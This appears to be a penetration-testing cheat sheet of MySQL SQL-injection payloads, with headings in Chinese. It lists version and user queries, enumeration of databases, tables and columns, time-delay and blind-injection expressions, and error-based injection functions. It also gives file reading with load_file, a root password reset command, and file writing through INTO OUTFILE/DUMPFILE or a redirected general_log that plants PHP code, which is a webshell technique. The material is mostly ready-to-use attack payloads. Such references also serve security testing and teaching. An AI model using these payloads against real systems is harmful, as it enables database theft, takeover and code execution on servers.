MySQL Payload
========================================

常见Payload
----------------------------------------
- Version 
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT 1 # comment``
    - ``SELECT /*comment*/1``
- Space
    - ``0x9`` ``0xa-0xd`` ``0x20`` ``0xa0``
- Current User
    - ``SELECT user()``
    - ``SELECT system_user()``
    - ``SELECT current_role()``
- List User
    - ``SELECT user FROM mysql.user``
- Current Database
    - ``SELECT database()``
- List Database
    - ``SELECT schema_name FROM information_schema.schemata``
- List Tables
    - ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- List Columns
    - ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
- If
    - ``SELECT if(1=1,'foo','bar');`` return 'foo'
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT 0x414243`` => return ``ABC``
- Delay
    - ``sleep(1)``
    - ``SELECT BENCHMARK(1000000,MD5('A'))``
- Read File
    - ``select @@datadir``
    - ``select load_file('databasename/tablename.MYD')``
- Blind
    - ``ascii(substring(str,pos,length)) & 32 = 1``
- Error Based
    - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
    - ``select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))``
- Change Password
    - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``

报错注入常见函数
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- extractvalue
- updatexml
- GeometryCollection
- linestring
- multilinestring
- multipoint
- multipolygon
- polygon
- exp

写文件
----------------------------------------

写文件前提
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- root 权限
- 知晓文件绝对路径
- 写入的路径存在写入权限
- secure_file_priv 允许向对应位置写入
- ``select count(file_priv) from mysql.user``

基于 into 写文件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

    union select 1,1,1 into outfile '/tmp/demo.txt'
    union select 1,1,1 into dumpfile '/tmp/demo.txt'

dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏

基于 log 写文件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. code-block:: sql

    show variables like '%general%';
    set global general_log = on;
    set global general_log_file = '/path/to/file';
    select '<?php var_dump("test");?>';
    set global general_log_file = '/original/path';
    set global general_log = off;
